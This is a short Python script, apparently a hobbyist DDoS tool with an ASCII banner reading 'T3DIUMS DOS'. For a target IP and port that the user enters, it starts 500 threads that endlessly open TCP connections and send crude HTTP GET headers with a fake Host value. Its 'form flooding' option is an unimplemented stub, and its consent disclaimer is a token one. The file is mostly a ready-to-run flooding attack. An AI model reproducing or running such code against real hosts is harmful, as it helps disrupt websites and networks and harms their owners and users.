#Hey there, you're either looking at the source code because you think im a nsa agent looking to honeypot your data (lmao), or a curious coder.
#Well if ur option 1: fear not ;), the codes really simple so you can see for yourself.

#imports
import threading
import socket

#functions

def begin():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        #the above makes a tcp connection

        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        #The above sends the header
        
        s.close()
        #closes Connection

def formddos():
    print("coming soon, but check out option 1 for now.")

#Some fancy stuff, nice right? Code without ascii = bad code. Take my advice.
print ("""Welcome to..

████████╗██████╗ ██████╗ ██╗██╗   ██╗███╗   ███╗███████╗
╚══██╔══╝╚════██╗██╔══██╗██║██║   ██║████╗ ████║██╔════╝
   ██║    █████╔╝██║  ██║██║██║   ██║██╔████╔██║███████╗
   ██║    ╚═══██╗██║  ██║██║██║   ██║██║╚██╔╝██║╚════██║
   ██║   ██████╔╝██████╔╝██║╚██████╔╝██║ ╚═╝ ██║███████║
   ╚═╝   ╚═════╝ ╚═════╝ ╚═╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝


  ██████╗  ██████╗ ███████╗
  ██╔══██╗██╔═══██╗██╔════╝
  ██║  ██║██║   ██║███████╗
  ██║  ██║██║   ██║╚════██║
  ██████╔╝╚██████╔╝███████║
  ╚═════╝  ╚═════╝ ╚══════╝

  Disclaimer: Use only with consent, I will NOT be held accountable for your actions:

  Press 1 to initiate form flooding: d(dos)
  Press 2 to initiate website (d)dosing

  NOTE: Statistics such as the num of connections are not shown, as its 1) useless but 2) less efficient. Speed increases feasability.
""")

choice = input(": ")
if choice == ("2"):
    target = input("Enter the IP ADDRESS of your target, be it a website or user: ")
    port = int(input("Enter the PORT in which you want to perform the ddos attack on: "))
    fake_ip = input("Enter a fake ip: ")
    for i in range(500):
        thread = threading.Thread(target=begin)
        thread.start()

elif choice == ("1"):
    formddos()
